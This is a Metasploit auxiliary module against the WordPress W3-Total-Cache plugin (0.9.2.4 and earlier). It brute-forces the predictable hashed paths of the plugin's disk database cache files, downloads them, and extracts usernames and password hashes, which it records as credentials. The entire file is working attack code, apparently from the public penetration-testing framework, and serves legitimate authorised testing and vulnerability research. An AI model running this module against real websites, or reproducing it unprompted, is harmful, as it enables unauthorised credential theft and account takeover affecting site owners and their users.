##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'          => 'WordPress W3-Total-Cache Plugin 0.9.2.4 (or before) Username and Hash Extract',
      'Description'   =>
        "The W3-Total-Cache Wordpress Plugin <= 0.9.2.4 can cache database statements
        and its results in files for fast access. Version 0.9.2.4 has been fixed afterwards
        so it can be vulnerable. These cache files are in the webroot of the Wordpress
        installation and can be downloaded if the name is guessed. This module tries to
        locate them with brute force in order to find usernames and password hashes in these
        files. W3 Total Cache must be configured with Database Cache enabled and Database
        Cache Method set to Disk to be vulnerable",
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          ['OSVDB', '88744'],
          ['URL', 'https://seclists.org/fulldisclosure/2012/Dec/242'],
          ['WPVDB', '6621']
        ],
      'Author'        =>
        [
          'Christian Mehlmauer',                    # Metasploit module
          'Jason A. Donenfeld <Jason[at]zx2c4.com>' # POC
        ]
    )

    register_options(
      [
        OptString.new('TABLE_PREFIX', [true,	'Wordpress table prefix', 'wp_']),
        OptInt.new('SITE_ITERATIONS', [true, 'Number of sites to iterate', 25]),
        OptInt.new('USER_ITERATIONS', [true, 'Number of users to iterate', 25])
      ])
  end

  def table_prefix
    datastore['TABLE_PREFIX']
  end

  def site_iterations
    datastore['SITE_ITERATIONS']
  end

  def user_iterations
    datastore['USER_ITERATIONS']
  end

  # Call the User site, so the db statement will be cached
  def cache_user_info(user_id)
    user_url = normalize_uri(target_uri)
    begin
      send_request_cgi(
        'uri'      => user_url,
        'method'   => 'GET',
        'vars_get' => {
          'author' => user_id.to_s
        }
      )

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      vprint_error("Unable to connect to #{user_url}")
    rescue ::Timeout::Error, ::Errno::EPIPE
      vprint_error("Unable to connect to #{user_url}")
    end

    nil
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :nonreplayable_hash,
      jtr_format: 'md5,des'
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    users_found = false

    (1..site_iterations).each do |site_id|

      vprint_status("Trying site_id #{site_id}...")

      (1..user_iterations).each do |user_id|

        vprint_status("Trying user_id #{user_id}...")

        # used to cache the statement
        cache_user_info(user_id)
        query = "SELECT * FROM #{table_prefix}users WHERE ID = '#{user_id}'"
        query_md5 = ::Rex::Text.md5(query)
        host = datastore['VHOST'] || ip
        key = "w3tc_#{host}_#{site_id}_sql_#{query_md5}"
        key_md5 = ::Rex::Text.md5(key)
        hash_path = normalize_uri(key_md5[0, 1], key_md5[1, 1], key_md5[2, 1], key_md5)
        url = normalize_uri(wordpress_url_wp_content, 'w3tc', 'dbcache', hash_path)

        result = nil
        begin
          result = send_request_cgi('uri' => url, 'method' => 'GET')
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          print_error("Unable to connect to #{url}")
          break
        rescue ::Timeout::Error, ::Errno::EPIPE
          print_error("Unable to connect to #{url}")
          break
        end

        if result.nil? || result.body.nil?
          print_error('No response received')
          break
        end

        match = result.body.scan(/.*"user_login";s:[0-9]+:"([^"]*)";s:[0-9]+:"user_pass";s:[0-9]+:"([^"]*)".*/)[0]
        unless match.nil?
          print_good("Username: #{match[0]}")
          print_good("Password Hash: #{match[1]}")
          report_cred(
            ip: rhost,
            port: rport,
            service_name: ssl ? 'https' : 'http',
            user: match[0],
            password: match[1],
            proof: result.body
          )
          users_found = true
        end
      end
    end
    print_error('No users found :(') unless users_found
  end
end
